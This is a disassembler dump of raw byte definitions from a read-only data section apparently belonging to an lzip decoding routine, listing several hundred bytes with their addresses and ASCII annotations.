.rodata.lzip_decode0:000000000000B18F                 db    0
.rodata.lzip_decode0:000000000000B190                 db  32h ; 2
.rodata.lzip_decode0:000000000000B191                 db    0
.rodata.lzip_decode0:000000000000B192                 db    0
.rodata.lzip_decode0:000000000000B193                 db    0
.rodata.lzip_decode0:000000000000B194                 db  73h ; s
.rodata.lzip_decode0:000000000000B195                 db    0
.rodata.lzip_decode0:000000000000B196                 db    0
.rodata.lzip_decode0:000000000000B197                 db    0
.rodata.lzip_decode0:000000000000B198                 db    2
.rodata.lzip_decode0:000000000000B199                 db    2
.rodata.lzip_decode0:000000000000B19A                 db    0
.rodata.lzip_decode0:000000000000B19B                 db    0
.rodata.lzip_decode0:000000000000B19C                 db 0B3h
.rodata.lzip_decode0:000000000000B19D                 db    0
.rodata.lzip_decode0:000000000000B19E                 db    0
.rodata.lzip_decode0:000000000000B19F                 db    0
.rodata.lzip_decode0:000000000000B1A0                 db  52h ; R
.rodata.lzip_decode0:000000000000B1A1                 db    0
.rodata.lzip_decode0:000000000000B1A2                 db    0
.rodata.lzip_decode0:000000000000B1A3                 db    0
.rodata.lzip_decode0:000000000000B1A4                 db  92h
.rodata.lzip_decode0:000000000000B1A5                 db    0
.rodata.lzip_decode0:000000000000B1A6                 db    0
.rodata.lzip_decode0:000000000000B1A7                 db    0
.rodata.lzip_decode0:000000000000B1A8                 db    3
.rodata.lzip_decode0:000000000000B1A9                 db    0
.rodata.lzip_decode0:000000000000B1AA                 db    0
.rodata.lzip_decode0:000000000000B1AB                 db    0
.rodata.lzip_decode0:000000000000B1AC                 db  93h
.rodata.lzip_decode0:000000000000B1AD                 db    2
.rodata.lzip_decode0:000000000000B1AE                 db    0
.rodata.lzip_decode0:000000000000B1AF                 db    0
.rodata.lzip_decode0:000000000000B1B0                 db    2
.rodata.lzip_decode0:000000000000B1B1                 db    2
.rodata.lzip_decode0:000000000000B1B2                 db    0
.rodata.lzip_decode0:000000000000B1B3                 db    0
.rodata.lzip_decode0:000000000000B1B4                 db  53h ; S
.rodata.lzip_decode0:000000000000B1B5                 db    0
.rodata.lzip_decode0:000000000000B1B6                 db    0
.rodata.lzip_decode0:000000000000B1B7                 db    0
.rodata.lzip_decode0:000000000000B1B8                 db  30h ; 0
.rodata.lzip_decode0:000000000000B1B9                 db    2
.rodata.lzip_decode0:000000000000B1BA                 db  40h ; @
.rodata.lzip_decode0:000000000000B1BB                 db    0
.rodata.lzip_decode0:000000000000B1BC                 db 0B2h
.rodata.lzip_decode0:000000000000B1BD                 db    0
.rodata.lzip_decode0:000000000000B1BE                 db    0
.rodata.lzip_decode0:000000000000B1BF                 db    0
.rodata.lzip_decode0:000000000000B1C0                 db 0A1h
.rodata.lzip_decode0:000000000000B1C1                 db    2
.rodata.lzip_decode0:000000000000B1C2                 db    4
.rodata.lzip_decode0:000000000000B1C3                 db    0
.rodata.lzip_decode0:000000000000B1C4                 db    2
.rodata.lzip_decode0:000000000000B1C5                 db    2
.rodata.lzip_decode0:000000000000B1C6                 db    0
.rodata.lzip_decode0:000000000000B1C7                 db    0
.rodata.lzip_decode0:000000000000B1C8                 db    3
.rodata.lzip_decode0:000000000000B1C9                 db    2
.rodata.lzip_decode0:000000000000B1CA                 db    0
.rodata.lzip_decode0:000000000000B1CB                 db    0
.rodata.lzip_decode0:000000000000B1CC                 db  42h ; B
.rodata.lzip_decode0:000000000000B1CD                 db    1
.rodata.lzip_decode0:000000000000B1CE                 db    0
.rodata.lzip_decode0:000000000000B1CF                 db    0
.rodata.lzip_decode0:000000000000B1D0                 db  83h
.rodata.lzip_decode0:000000000000B1D1                 db    1
.rodata.lzip_decode0:000000000000B1D2                 db    0
.rodata.lzip_decode0:000000000000B1D3                 db    0
.rodata.lzip_decode0:000000000000B1D4                 db  92h
.rodata.lzip_decode0:000000000000B1D5                 db    0
.rodata.lzip_decode0:000000000000B1D6                 db    0
.rodata.lzip_decode0:000000000000B1D7                 db    0
.rodata.lzip_decode0:000000000000B1D8                 db    3
.rodata.lzip_decode0:000000000000B1D9                 db    0
.rodata.lzip_decode0:000000000000B1DA                 db    0
.rodata.lzip_decode0:000000000000B1DB                 db    0
.rodata.lzip_decode0:000000000000B1DC                 db  20h
.rodata.lzip_decode0:000000000000B1DD                 db    1
.rodata.lzip_decode0:000000000000B1DE                 db 0E0h
.rodata.lzip_decode0:000000000000B1DF                 db    0
.rodata.lzip_decode0:000000000000B1E0                 db 0E2h
.rodata.lzip_decode0:000000000000B1E1                 db    1
.rodata.lzip_decode0:000000000000B1E2                 db    0
.rodata.lzip_decode0:000000000000B1E3                 db    0
.rodata.lzip_decode0:000000000000B1E4                 db  91h
.rodata.lzip_decode0:000000000000B1E5                 db    2
.rodata.lzip_decode0:000000000000B1E6                 db    4
.rodata.lzip_decode0:000000000000B1E7                 db    0
.rodata.lzip_decode0:000000000000B1E8                 db    4
.rodata.lzip_decode0:000000000000B1E9                 db    0
.rodata.lzip_decode0:000000000000B1EA                 db  60h ; `
.rodata.lzip_decode0:000000000000B1EB                 db    9
.rodata.lzip_decode0:000000000000B1EC                 db 0D2h
.rodata.lzip_decode0:000000000000B1ED                 db    1
.rodata.lzip_decode0:000000000000B1EE                 db    0
.rodata.lzip_decode0:000000000000B1EF                 db    0
.rodata.lzip_decode0:000000000000B1F0                 db    3
.rodata.lzip_decode0:000000000000B1F1                 db    0
.rodata.lzip_decode0:000000000000B1F2                 db    0
.rodata.lzip_decode0:000000000000B1F3                 db    0
.rodata.lzip_decode0:000000000000B1F4                 db    3
.rodata.lzip_decode0:000000000000B1F5                 db    0
.rodata.lzip_decode0:000000000000B1F6                 db    0
.rodata.lzip_decode0:000000000000B1F7                 db    0
.rodata.lzip_decode0:000000000000B1F8                 db    3
.rodata.lzip_decode0:000000000000B1F9                 db    0
.rodata.lzip_decode0:000000000000B1FA                 db    0
.rodata.lzip_decode0:000000000000B1FB                 db    0
.rodata.lzip_decode0:000000000000B1FC                 db    3
.rodata.lzip_decode0:000000000000B1FD                 db    0
.rodata.lzip_decode0:000000000000B1FE                 db    0
.rodata.lzip_decode0:000000000000B1FF                 db    0
.rodata.lzip_decode0:000000000000B200                 db    4
.rodata.lzip_decode0:000000000000B201                 db    0
.rodata.lzip_decode0:000000000000B202                 db 0D0h
.rodata.lzip_decode0:000000000000B203                 db    9
.rodata.lzip_decode0:000000000000B204                 db 0E2h
.rodata.lzip_decode0:000000000000B205                 db    1
.rodata.lzip_decode0:000000000000B206                 db    0
.rodata.lzip_decode0:000000000000B207                 db    0
.rodata.lzip_decode0:000000000000B208                 db    4
.rodata.lzip_decode0:000000000000B209                 db    0
.rodata.lzip_decode0:000000000000B20A                 db  68h ; h
.rodata.lzip_decode0:000000000000B20B                 db    4
.rodata.lzip_decode0:000000000000B20C                 db  32h ; 2
.rodata.lzip_decode0:000000000000B20D                 db    1
.rodata.lzip_decode0:000000000000B20E                 db    0
.rodata.lzip_decode0:000000000000B20F                 db    0
.rodata.lzip_decode0:000000000000B210                 db    3
.rodata.lzip_decode0:000000000000B211                 db    0
.rodata.lzip_decode0:000000000000B212                 db    0
.rodata.lzip_decode0:000000000000B213                 db    0
.rodata.lzip_decode0:000000000000B214                 db    3
.rodata.lzip_decode0:000000000000B215                 db    0
.rodata.lzip_decode0:000000000000B216                 db    0
.rodata.lzip_decode0:000000000000B217                 db    0
.rodata.lzip_decode0:000000000000B218                 db  42h ; B
.rodata.lzip_decode0:000000000000B219                 db    0
.rodata.lzip_decode0:000000000000B21A                 db    0
.rodata.lzip_decode0:000000000000B21B                 db    0
.rodata.lzip_decode0:000000000000B21C                 db 0C3h
.rodata.lzip_decode0:000000000000B21D                 db    0
.rodata.lzip_decode0:000000000000B21E                 db    0
.rodata.lzip_decode0:000000000000B21F                 db    0
.rodata.lzip_decode0:000000000000B220                 db  80h
.rodata.lzip_decode0:000000000000B221                 db    0
.rodata.lzip_decode0:000000000000B222                 db  18h
.rodata.lzip_decode0:000000000000B223                 db    0
.rodata.lzip_decode0:000000000000B224                 db  72h ; r
.rodata.lzip_decode0:000000000000B225                 db    1
.rodata.lzip_decode0:000000000000B226                 db    0
.rodata.lzip_decode0:000000000000B227                 db    0
.rodata.lzip_decode0:000000000000B228                 db  21h ; !
.rodata.lzip_decode0:000000000000B229                 db    2
.rodata.lzip_decode0:000000000000B22A                 db    4
.rodata.lzip_decode0:000000000000B22B                 db    0
.rodata.lzip_decode0:000000000000B22C                 db  32h ; 2
.rodata.lzip_decode0:000000000000B22D                 db    1
.rodata.lzip_decode0:000000000000B22E                 db    0
.rodata.lzip_decode0:000000000000B22F                 db    0
.rodata.lzip_decode0:000000000000B230                 db 0D2h
.rodata.lzip_decode0:000000000000B231                 db    0
.rodata.lzip_decode0:000000000000B232                 db    0
.rodata.lzip_decode0:000000000000B233                 db    0
.rodata.lzip_decode0:000000000000B234                 db  13h
.rodata.lzip_decode0:000000000000B235                 db    1
.rodata.lzip_decode0:000000000000B236                 db    0
.rodata.lzip_decode0:000000000000B237                 db    0
.rodata.lzip_decode0:000000000000B238                 db  53h ; S
.rodata.lzip_decode0:000000000000B239                 db    0
.rodata.lzip_decode0:000000000000B23A                 db    0
.rodata.lzip_decode0:000000000000B23B                 db    0
.rodata.lzip_decode0:000000000000B23C                 db  92h
.rodata.lzip_decode0:000000000000B23D                 db    0
.rodata.lzip_decode0:000000000000B23E                 db    0
.rodata.lzip_decode0:000000000000B23F                 db    0
.rodata.lzip_decode0:000000000000B240                 db  53h ; S
.rodata.lzip_decode0:000000000000B241                 db    0
.rodata.lzip_decode0:000000000000B242                 db    0
.rodata.lzip_decode0:000000000000B243                 db    0
.rodata.lzip_decode0:000000000000B244                 db  82h
.rodata.lzip_decode0:000000000000B245                 db    0
.rodata.lzip_decode0:000000000000B246                 db    0
.rodata.lzip_decode0:000000000000B247                 db    0
.rodata.lzip_decode0:000000000000B248                 db  20h
.rodata.lzip_decode0:000000000000B249                 db    0
.rodata.lzip_decode0:000000000000B24A                 db  48h ; H
.rodata.lzip_decode0:000000000000B24B                 db    0
.rodata.lzip_decode0:000000000000B24C                 db  52h ; R
.rodata.lzip_decode0:000000000000B24D                 db    0
.rodata.lzip_decode0:000000000000B24E                 db    0
.rodata.lzip_decode0:000000000000B24F                 db    0
.rodata.lzip_decode0:000000000000B250                 db    4
.rodata.lzip_decode0:000000000000B251                 db    0
.rodata.lzip_decode0:000000000000B252                 db 0E8h
.rodata.lzip_decode0:000000000000B253                 db    7
.rodata.lzip_decode0:000000000000B254                 db  62h ; b
.rodata.lzip_decode0:000000000000B255                 db    0
.rodata.lzip_decode0:000000000000B256                 db    0
.rodata.lzip_decode0:000000000000B257                 db    0
.rodata.lzip_decode0:000000000000B258                 db  92h
.rodata.lzip_decode0:000000000000B259                 db    0
.rodata.lzip_decode0:000000000000B25A                 db    0
.rodata.lzip_decode0:000000000000B25B                 db    0
.rodata.lzip_decode0:000000000000B25C                 db  83h
.rodata.lzip_decode0:000000000000B25D                 db    1
.rodata.lzip_decode0:000000000000B25E                 db    0
.rodata.lzip_decode0:000000000000B25F                 db    0
.rodata.lzip_decode0:000000000000B260                 db    3
.rodata.lzip_decode0:000000000000B261                 db    0
.rodata.lzip_decode0:000000000000B262                 db    0
.rodata.lzip_decode0:000000000000B263                 db    0
.rodata.lzip_decode0:000000000000B264                 db    4
.rodata.lzip_decode0:000000000000B265                 db    0
.rodata.lzip_decode0:000000000000B266                 db  68h ; h
.rodata.lzip_decode0:000000000000B267                 db    2
.rodata.lzip_decode0:000000000000B268                 db  32h ; 2
.rodata.lzip_decode0:000000000000B269                 db    1
.rodata.lzip_decode0:000000000000B26A                 db    0
.rodata.lzip_decode0:000000000000B26B                 db    0
.rodata.lzip_decode0:000000000000B26C                 db    3
.rodata.lzip_decode0:000000000000B26D                 db    0
.rodata.lzip_decode0:000000000000B26E                 db    0
.rodata.lzip_decode0:000000000000B26F                 db    0
.rodata.lzip_decode0:000000000000B270                 db    3
.rodata.lzip_decode0:000000000000B271                 db    0
.rodata.lzip_decode0:000000000000B272                 db    0
.rodata.lzip_decode0:000000000000B273                 db    0
.rodata.lzip_decode0:000000000000B274                 db  42h ; B
.rodata.lzip_decode0:000000000000B275                 db    0
.rodata.lzip_decode0:000000000000B276                 db    0
.rodata.lzip_decode0:000000000000B277                 db    0
.rodata.lzip_decode0:000000000000B278                 db  53h ; S
.rodata.lzip_decode0:000000000000B279                 db    0
.rodata.lzip_decode0:000000000000B27A                 db    0
.rodata.lzip_decode0:000000000000B27B                 db    0
.rodata.lzip_decode0:000000000000B27C                 db  23h ; #
.rodata.lzip_decode0:000000000000B27D                 db    1
.rodata.lzip_decode0:000000000000B27E                 db    0
.rodata.lzip_decode0:000000000000B27F                 db    0
.rodata.lzip_decode0:000000000000B280                 db  43h ; C
.rodata.lzip_decode0:000000000000B281                 db    0
.rodata.lzip_decode0:000000000000B282                 db    0
.rodata.lzip_decode0:000000000000B283                 db    0
.rodata.lzip_decode0:000000000000B284                 db 0C2h
.rodata.lzip_decode0:000000000000B285                 db    0
.rodata.lzip_decode0:000000000000B286                 db    0
.rodata.lzip_decode0:000000000000B287                 db    0
.rodata.lzip_decode0:000000000000B288                 db    3
.rodata.lzip_decode0:000000000000B289                 db    0
.rodata.lzip_decode0:000000000000B28A                 db    0
.rodata.lzip_decode0:000000000000B28B                 db    0
.rodata.lzip_decode0:000000000000B28C                 db 0F0h
.rodata.lzip_decode0:000000000000B28D                 db    2
.rodata.lzip_decode0:000000000000B28E                 db  28h ; (
.rodata.lzip_decode0:000000000000B28F                 db    0
.rodata.lzip_decode0:000000000000B290                 db  92h
.rodata.lzip_decode0:000000000000B291                 db    1
.rodata.lzip_decode0:000000000000B292                 db    0
.rodata.lzip_decode0:000000000000B293                 db    0
.rodata.lzip_decode0:000000000000B294                 db  11h
.rodata.lzip_decode0:000000000000B295                 db    1
.rodata.lzip_decode0:000000000000B296                 db    4
.rodata.lzip_decode0:000000000000B297                 db    0
.rodata.lzip_decode0:000000000000B298                 db 0D2h
.rodata.lzip_decode0:000000000000B299                 db    0
.rodata.lzip_decode0:000000000000B29A                 db    0
.rodata.lzip_decode0:000000000000B29B                 db    0
.rodata.lzip_decode0:000000000000B29C                 db  13h
.rodata.lzip_decode0:000000000000B29D                 db    1
.rodata.lzip_decode0:000000000000B29E                 db    0
.rodata.lzip_decode0:000000000000B29F                 db    0
.rodata.lzip_decode0:000000000000B2A0                 db  53h ; S
.rodata.lzip_decode0:000000000000B2A1                 db    0
.rodata.lzip_decode0:000000000000B2A2                 db    0
.rodata.lzip_decode0:000000000000B2A3                 db    0
.rodata.lzip_decode0:000000000000B2A4                 db  92h
.rodata.lzip_decode0:000000000000B2A5                 db    0
.rodata.lzip_decode0:000000000000B2A6                 db    0
.rodata.lzip_decode0:000000000000B2A7                 db    0
.rodata.lzip_decode0:000000000000B2A8                 db  53h ; S
.rodata.lzip_decode0:000000000000B2A9                 db    0
.rodata.lzip_decode0:000000000000B2AA                 db    0
.rodata.lzip_decode0:000000000000B2AB                 db    0
.rodata.lzip_decode0:000000000000B2AC                 db  72h ; r
.rodata.lzip_decode0:000000000000B2AD                 db    0
.rodata.lzip_decode0:000000000000B2AE                 db    0
.rodata.lzip_decode0:000000000000B2AF                 db    0
.rodata.lzip_decode0:000000000000B2B0                 db  82h
.rodata.lzip_decode0:000000000000B2B1                 db    0
.rodata.lzip_decode0:000000000000B2B2                 db    0
.rodata.lzip_decode0:000000000000B2B3                 db    0
.rodata.lzip_decode0:000000000000B2B4                 db    4
.rodata.lzip_decode0:000000000000B2B5                 db    0
.rodata.lzip_decode0:000000000000B2B6                 db 0E0h
.rodata.lzip_decode0:000000000000B2B7                 db    6
.rodata.lzip_decode0:000000000000B2B8                 db  82h
.rodata.lzip_decode0:000000000000B2B9                 db    1
.rodata.lzip_decode0:000000000000B2BA                 db    0
.rodata.lzip_decode0:000000000000B2BB                 db    0
.rodata.lzip_decode0:000000000000B2BC                 db  33h ; 3
.rodata.lzip_decode0:000000000000B2BD                 db    0
.rodata.lzip_decode0:000000000000B2BE                 db    0
.rodata.lzip_decode0:000000000000B2BF                 db    0
.rodata.lzip_decode0:000000000000B2C0                 db 0E3h
.rodata.lzip_decode0:000000000000B2C1                 db    1
.rodata.lzip_decode0:000000000000B2C2                 db    0
.rodata.lzip_decode0:000000000000B2C3                 db    0
.rodata.lzip_decode0:000000000000B2C4                 db  12h
.rodata.lzip_decode0:000000000000B2C5                 db    0
.rodata.lzip_decode0:000000000000B2C6                 db    0
.rodata.lzip_decode0:000000000000B2C7                 db    0
.rodata.lzip_decode0:000000000000B2C8                 db 0C2h
.rodata.lzip_decode0:000000000000B2C9                 db    1
.rodata.lzip_decode0:000000000000B2CA                 db    0
.rodata.lzip_decode0:000000000000B2CB                 db    0
.rodata.lzip_decode0:000000000000B2CC                 db 0B3h
.rodata.lzip_decode0:000000000000B2CD                 db    0
.rodata.lzip_decode0:000000000000B2CE                 db    0
.rodata.lzip_decode0:000000000000B2CF                 db    0
.rodata.lzip_decode0:000000000000B2D0                 db 0A3h
.rodata.lzip_decode0:000000000000B2D1                 db    0
.rodata.lzip_decode0:000000000000B2D2                 db    0
.rodata.lzip_decode0:000000000000B2D3                 db    0
.rodata.lzip_decode0:000000000000B2D4                 db 0D3h
.rodata.lzip_decode0:000000000000B2D5                 db    0
.rodata.lzip_decode0:000000000000B2D6                 db    0
.rodata.lzip_decode0:000000000000B2D7                 db    0
.rodata.lzip_decode0:000000000000B2D8                 db 0C2h
.rodata.lzip_decode0:000000000000B2D9                 db    0
.rodata.lzip_decode0:000000000000B2DA                 db    0
.rodata.lzip_decode0:000000000000B2DB                 db    0
.rodata.lzip_decode0:000000000000B2DC                 db  32h ; 2
.rodata.lzip_decode0:000000000000B2DD                 db    1
.rodata.lzip_decode0:000000000000B2DE                 db    0
.rodata.lzip_decode0:000000000000B2DF                 db    0
.rodata.lzip_decode0:000000000000B2E0                 db  12h
.rodata.lzip_decode0:000000000000B2E1                 db    1
.rodata.lzip_decode0:000000000000B2E2                 db    0
.rodata.lzip_decode0:000000000000B2E3                 db    0
.rodata.lzip_decode0:000000000000B2E4                 db  13h
.rodata.lzip_decode0:000000000000B2E5                 db    1
.rodata.lzip_decode0:000000000000B2E6                 db    0
.rodata.lzip_decode0:000000000000B2E7                 db    0
.rodata.lzip_decode0:000000000000B2E8                 db    2
.rodata.lzip_decode0:000000000000B2E9                 db    1
.rodata.lzip_decode0:000000000000B2EA                 db    0
.rodata.lzip_decode0:000000000000B2EB                 db    0
.rodata.lzip_decode0:000000000000B2EC                 db    3
.rodata.lzip_decode0:000000000000B2ED                 db    0
.rodata.lzip_decode0:000000000000B2EE                 db    0
.rodata.lzip_decode0:000000000000B2EF                 db    0
.rodata.lzip_decode0:000000000000B2F0                 db  30h ; 0
.rodata.lzip_decode0:000000000000B2F1                 db    0
.rodata.lzip_decode0:000000000000B2F2                 db  3Ch ; <
.rodata.lzip_decode0:000000000000B2F3                 db    0
.rodata.lzip_decode0:000000000000B2F4                 db    3
.rodata.lzip_decode0:000000000000B2F5                 db    0
.rodata.lzip_decode0:000000000000B2F6                 db    0
.rodata.lzip_decode0:000000000000B2F7                 db    0
.rodata.lzip_decode0:000000000000B2F8                 db  61h ; a
.rodata.lzip_decode0:000000000000B2F9                 db    1
.rodata.lzip_decode0:000000000000B2FA                 db    4
.rodata.lzip_decode0:000000000000B2FB                 db    0
.rodata.lzip_decode0:000000000000B2FC                 db    4
.rodata.lzip_decode0:000000000000B2FD                 db    0
.rodata.lzip_decode0:000000000000B2FE                 db  28h ; (
.rodata.lzip_decode0:000000000000B2FF                 db  0Bh
.rodata.lzip_decode0:000000000000B300                 db  42h ; B
.rodata.lzip_decode0:000000000000B301                 db    1
.rodata.lzip_decode0:000000000000B302                 db    0
.rodata.lzip_decode0:000000000000B303                 db    0
.rodata.lzip_decode0:000000000000B304                 db  13h
.rodata.lzip_decode0:000000000000B305                 db    0
.rodata.lzip_decode0:000000000000B306                 db    0
.rodata.lzip_decode0:000000000000B307                 db    0
.rodata.lzip_decode0:000000000000B308                 db 0B3h
.rodata.lzip_decode0:000000000000B309                 db    1
.rodata.lzip_decode0:000000000000B30A                 db    0
.rodata.lzip_decode0:000000000000B30B                 db    0
.rodata.lzip_decode0:000000000000B30C                 db    4
.rodata.lzip_decode0:000000000000B30D                 db    0
.rodata.lzip_decode0:000000000000B30E                 db  38h ; 8
.rodata.lzip_decode0:000000000000B30F                 db    8
.rodata.lzip_decode0:000000000000B310                 db  22h ; "
.rodata.lzip_decode0:000000000000B311                 db    1
.rodata.lzip_decode0:000000000000B312                 db    0
.rodata.lzip_decode0:000000000000B313                 db    0
.rodata.lzip_decode0:000000000000B314                 db  12h
.rodata.lzip_decode0:000000000000B315                 db    0
.rodata.lzip_decode0:000000000000B316                 db    0
.rodata.lzip_decode0:000000000000B317                 db    0
.rodata.lzip_decode0:000000000000B318                 db  50h ; P
.rodata.lzip_decode0:000000000000B319                 db    3
.rodata.lzip_decode0:000000000000B31A                 db  0Ch
.rodata.lzip_decode0:000000000000B31B                 db    0
.rodata.lzip_decode0:000000000000B31C                 db 0B2h
.rodata.lzip_decode0:000000000000B31D                 db    1
.rodata.lzip_decode0:000000000000B31E                 db    0
.rodata.lzip_decode0:000000000000B31F                 db    0
.rodata.lzip_decode0:000000000000B320                 db  71h ; q
.rodata.lzip_decode0:000000000000B321                 db    1
.rodata.lzip_decode0:000000000000B322                 db    4
.rodata.lzip_decode0:000000000000B323                 db    0
.rodata.lzip_decode0:000000000000B324                 db  62h ; b
.rodata.lzip_decode0:000000000000B325                 db    1
.rodata.lzip_decode0:000000000000B326                 db    0
.rodata.lzip_decode0:000000000000B327                 db    0
.rodata.lzip_decode0:000000000000B328                 db  63h ; c
.rodata.lzip_decode0:000000000000B329                 db    0
.rodata.lzip_decode0:000000000000B32A                 db    0
.rodata.lzip_decode0:000000000000B32B                 db    0
.rodata.lzip_decode0:000000000000B32C                 db  52h ; R
.rodata.lzip_decode0:000000000000B32D                 db    0
.rodata.lzip_decode0:000000000000B32E                 db    0
.rodata.lzip_decode0:000000000000B32F                 db    0
.rodata.lzip_decode0:000000000000B330                 db  93h
.rodata.lzip_decode0:000000000000B331                 db    1
.rodata.lzip_decode0:000000000000B332                 db    0
.rodata.lzip_decode0:000000000000B333                 db    0
.rodata.lzip_decode0:000000000000B334                 db  82h
.rodata.lzip_decode0:000000000000B335                 db    1
.rodata.lzip_decode0:000000000000B336                 db    0
.rodata.lzip_decode0:000000000000B337                 db    0
.rodata.lzip_decode0:000000000000B338                 db  93h
.rodata.lzip_decode0:000000000000B339                 db    0
.rodata.lzip_decode0:000000000000B33A                 db    0
.rodata.lzip_decode0:000000000000B33B                 db    0
.rodata.lzip_decode0:000000000000B33C                 db  82h
.rodata.lzip_decode0:000000000000B33D                 db    0
.rodata.lzip_decode0:000000000000B33E                 db    0
.rodata.lzip_decode0:000000000000B33F                 db    0
.rodata.lzip_decode0:000000000000B340                 db    3
.rodata.lzip_decode0:000000000000B341                 db    1
.rodata.lzip_decode0:000000000000B342                 db    0
.rodata.lzip_decode0:000000000000B343                 db    0
.rodata.lzip_decode0:000000000000B344                 db  72h ; r
.rodata.lzip_decode0:000000000000B345                 db    0
.rodata.lzip_decode0:000000000000B346                 db    0
.rodata.lzip_decode0:000000000000B347                 db    0
.rodata.lzip_decode0:000000000000B348                 db    4
.rodata.lzip_decode0:000000000000B349                 db    0
.rodata.lzip_decode0:000000000000B34A                 db 0A8h
.rodata.lzip_decode0:000000000000B34B                 db    2
.rodata.lzip_decode0:000000000000B34C                 db  52h ; R
.rodata.lzip_decode0:000000000000B34D                 db    3
.rodata.lzip_decode0:000000000000B34E                 db    0
.rodata.lzip_decode0:000000000000B34F                 db    0
.rodata.lzip_decode0:000000000000B350                 db  23h ; #
.rodata.lzip_decode0:000000000000B351                 db    2
.rodata.lzip_decode0:000000000000B352                 db    0
.rodata.lzip_decode0:000000000000B353                 db    0
.rodata.lzip_decode0:000000000000B354                 db  52h ; R
.rodata.lzip_decode0:000000000000B355                 db    0
.rodata.lzip_decode0:000000000000B356                 db    0
.rodata.lzip_decode0:000000000000B357                 db    0
.rodata.lzip_decode0:000000000000B358                 db  93h
.rodata.lzip_decode0:000000000000B359                 db    1
.rodata.lzip_decode0:000000000000B35A                 db    0
.rodata.lzip_decode0:000000000000B35B                 db    0
.rodata.lzip_decode0:000000000000B35C                 db 0C2h
.rodata.lzip_decode0:000000000000B35D                 db    1
.rodata.lzip_decode0:000000000000B35E                 db    0
.rodata.lzip_decode0:000000000000B35F                 db    0
.rodata.lzip_decode0:000000000000B360                 db  23h ; #
.rodata.lzip_decode0:000000000000B361                 db    1
.rodata.lzip_decode0:000000000000B362                 db    0
.rodata.lzip_decode0:000000000000B363                 db    0
.rodata.lzip_decode0:000000000000B364                 db 0A3h
.rodata.lzip_decode0:000000000000B365                 db    0
.rodata.lzip_decode0:000000000000B366                 db    0
.rodata.lzip_decode0:000000000000B367                 db    0
.rodata.lzip_decode0:000000000000B368                 db    4
.rodata.lzip_decode0:000000000000B369                 db    0
.rodata.lzip_decode0:000000000000B36A                 db    8
.rodata.lzip_decode0:000000000000B36B                 db  0Ch
.rodata.lzip_decode0:000000000000B36C                 db  52h ; R
.rodata.lzip_decode0:000000000000B36D                 db    3
.rodata.lzip_decode0:000000000000B36E                 db    0
.rodata.lzip_decode0:000000000000B36F                 db    0
.rodata.lzip_decode0:000000000000B370                 db  23h ; #
.rodata.lzip_decode0:000000000000B371                 db    2
.rodata.lzip_decode0:000000000000B372                 db    0
.rodata.lzip_decode0:000000000000B373                 db    0
.rodata.lzip_decode0:000000000000B374                 db  52h ; R
.rodata.lzip_decode0:000000000000B375                 db    0
.rodata.lzip_decode0:000000000000B376                 db    0
.rodata.lzip_decode0:000000000000B377                 db    0
.rodata.lzip_decode0:000000000000B378                 db  33h ; 3
.rodata.lzip_decode0:000000000000B379                 db    0
.rodata.lzip_decode0:000000000000B37A                 db    0
.rodata.lzip_decode0:000000000000B37B                 db    0
.rodata.lzip_decode0:000000000000B37C                 db  43h ; C
.rodata.lzip_decode0:000000000000B37D                 db    1
.rodata.lzip_decode0:000000000000B37E                 db    0
.rodata.lzip_decode0:000000000000B37F                 db    0
.rodata.lzip_decode0:000000000000B380                 db  82h
.rodata.lzip_decode0:000000000000B381                 db    0
.rodata.lzip_decode0:000000000000B382                 db    0
.rodata.lzip_decode0:000000000000B383                 db    0
.rodata.lzip_decode0:000000000000B384                 db    4
.rodata.lzip_decode0:000000000000B385                 db    0
.rodata.lzip_decode0:000000000000B386                 db 0F0h
.rodata.lzip_decode0:000000000000B387                 db    3
.rodata.lzip_decode0:000000000000B388                 db  42h ; B
.rodata.lzip_decode0:000000000000B389                 db    1
.rodata.lzip_decode0:000000000000B38A                 db    0
.rodata.lzip_decode0:000000000000B38B                 db    0
.rodata.lzip_decode0:000000000000B38C                 db  32h ; 2
.rodata.lzip_decode0:000000000000B38D                 db    0
.rodata.lzip_decode0:000000000000B38E                 db    0
.rodata.lzip_decode0:000000000000B38F                 db    0
.rodata.lzip_decode0:000000000000B390                 db  62h ; b
.rodata.lzip_decode0:000000000000B391                 db    0
.rodata.lzip_decode0:000000000000B392                 db    0
.rodata.lzip_decode0:000000000000B393                 db    0
.rodata.lzip_decode0:000000000000B394                 db 0F3h
.rodata.lzip_decode0:000000000000B395                 db    1
.rodata.lzip_decode0:000000000000B396                 db    0
.rodata.lzip_decode0:000000000000B397                 db    0
.rodata.lzip_decode0:000000000000B398                 db  42h ; B
.rodata.lzip_decode0:000000000000B399                 db    0
.rodata.lzip_decode0:000000000000B39A                 db    0
.rodata.lzip_decode0:000000000000B39B                 db    0
.rodata.lzip_decode0:000000000000B39C                 db    0
.rodata.lzip_decode0:000000000000B39D                 db    3
.rodata.lzip_decode0:000000000000B39E                 db  34h ; 4
.rodata.lzip_decode0:000000000000B39F                 db    0
.rodata.lzip_decode0:000000000000B3A0                 db  70h ; p
.rodata.lzip_decode0:000000000000B3A1                 db    2
.rodata.lzip_decode0:000000000000B3A2                 db  18h
.rodata.lzip_decode0:000000000000B3A3                 db    0
.rodata.lzip_decode0:000000000000B3A4                 db 0F2h
.rodata.lzip_decode0:000000000000B3A5                 db    2
.rodata.lzip_decode0:000000000000B3A6                 db    0
.rodata.lzip_decode0:000000000000B3A7                 db    0
.rodata.lzip_decode0:000000000000B3A8                 db 0F1h
.rodata.lzip_decode0:000000000000B3A9                 db    1
.rodata.lzip_decode0:000000000000B3AA                 db    8
.rodata.lzip_decode0:000000000000B3AB                 db    0
.rodata.lzip_decode0:000000000000B3AC                 db  33h ; 3
.rodata.lzip_decode0:000000000000B3AD                 db    1
.rodata.lzip_decode0:000000000000B3AE                 db    0
.rodata.lzip_decode0:000000000000B3AF                 db    0
.rodata.lzip_decode0:000000000000B3B0                 db 0C2h
.rodata.lzip_decode0:000000000000B3B1                 db    0
.rodata.lzip_decode0:000000000000B3B2                 db    0
.rodata.lzip_decode0:000000000000B3B3                 db    0
.rodata.lzip_decode0:000000000000B3B4                 db 0A3h
.rodata.lzip_decode0:000000000000B3B5                 db    1
.rodata.lzip_decode0:000000000000B3B6                 db    0
.rodata.lzip_decode0:000000000000B3B7                 db    0
.rodata.lzip_decode0:000000000000B3B8                 db 0B2h
.rodata.lzip_decode0:000000000000B3B9                 db    1
.rodata.lzip_decode0:000000000000B3BA                 db    0
.rodata.lzip_decode0:000000000000B3BB                 db    0
.rodata.lzip_decode0:000000000000B3BC                 db    4
.rodata.lzip_decode0:000000000000B3BD                 db    0
.rodata.lzip_decode0:000000000000B3BE                 db  18h
.rodata.lzip_decode0:000000000000B3BF                 db    1
